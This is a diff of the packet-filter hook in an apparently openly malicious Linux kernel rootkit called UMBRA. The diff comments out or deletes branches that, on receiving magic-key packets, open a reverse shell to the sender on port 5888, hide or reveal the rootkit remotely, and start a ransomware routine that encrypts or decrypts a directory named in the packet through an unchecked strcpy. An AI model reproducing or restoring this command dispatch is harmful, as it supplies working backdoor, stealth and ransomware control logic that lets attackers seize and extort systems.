@@ -76,48 +76,22 @@ static unsigned int my_nf_hookfn(void *priv,
             return NF_ACCEPT;
         }
         
-        if(memcmp(user_data, UMBRA_BACKDOOR_KEY, strlen(UMBRA_BACKDOOR_KEY))==0){
-            /****BACKDOOR KEY - Open a shell***/
+        // if(memcmp(user_data, UMBRA_BACKDOOR_KEY, strlen(UMBRA_BACKDOOR_KEY))==0){
+        //     /****BACKDOOR KEY - Open a shell***/
 
-            //Packet had the secret payload.
-            printk(KERN_INFO "UMBRA:: Received backdoor packet \n");
-            //kfree(_data);
+        //     //Packet had the secret payload.
+        //     printk(KERN_INFO "UMBRA:: Received backdoor packet \n");
+        //     //kfree(_data);
             
-            //TODO Use a port specified in malicious packet to spawn shell. Right now always 5888
-            snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
-            /*sprintf(port, "%d", sport);*/
-            printk(KERN_INFO "UMBRA:: Shell connecting to %s:%s \n", ip_source, REVERSE_SHELL_PORT);
+        //     //TODO Use a port specified in malicious packet to spawn shell. Right now always 5888
+        //     // snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
+        //     /*sprintf(port, "%d", sport);*/
+        //     // printk(KERN_INFO "UMBRA:: Shell connecting to %s:%s \n", ip_source, REVERSE_SHELL_PORT);
 
-            start_reverse_shell(ip_source, REVERSE_SHELL_PORT);
-            //TODO: Hide the backdoor packet to the local system
-            return NF_DROP;
-        }else if(memcmp(user_data, UMBRA_HIDE_ROOTKIT_KEY, strlen(UMBRA_HIDE_ROOTKIT_KEY))==0){
-            /****HIDE ROOTKIT KEY - Hide the rootkit, remotely***/
-
-            printk(KERN_INFO "UMBRA:: Received order to hide the rootkit \n");
-            hide_rootkit();
-            return NF_DROP;
-
-        }else if(memcmp(user_data, UMBRA_SHOW_ROOTKIT_KEY, strlen(UMBRA_SHOW_ROOTKIT_KEY))==0){
-            /****SHOW ROOTKIT KEY - Show the rootkit, remotely***/
-
-            printk(KERN_INFO "UMBRA:: Received order to unhide the rookit \n");
-            show_rootkit();
-            return NF_DROP;
-        }else if(memcmp(user_data, UMBRA_ENCRYPT_DIR_KEY, strlen(UMBRA_ENCRYPT_DIR_KEY))==0){
-            //Now we take out the directory which should come in user_data
-            char encrypt_path[UMBRA_ENCRYPT_DIR_KEY_BUF_LEN];
-            strcpy(encrypt_path, user_data+strlen(UMBRA_ENCRYPT_DIR_KEY));
-            printk(KERN_INFO "UMBRA:: Received order to ENCRYPT %s \n", encrypt_path);
-            start_ransom_module(RANSOM_ENCRYPT, encrypt_path);
-            return NF_DROP;
-        }else if(memcmp(user_data, UMBRA_DECRYPT_DIR_KEY, strlen(UMBRA_DECRYPT_DIR_KEY))==0){
-            char decrypt_path[UMBRA_DECRYPT_DIR_KEY_BUF_LEN];
-            strcpy(decrypt_path, user_data+strlen(UMBRA_DECRYPT_DIR_KEY));
-            printk(KERN_INFO "UMBRA:: Received order to DECRYPT %s \n", decrypt_path);
-            start_ransom_module(RANSOM_DECRYPT, decrypt_path);
-            return NF_DROP;
-        }
+        //     // start_reverse_shell(ip_source, REVERSE_SHELL_PORT);
+        //     //TODO: Hide the backdoor packet to the local system
+        //     return NF_DROP;
+        // }
 
 
         return NF_ACCEPT;
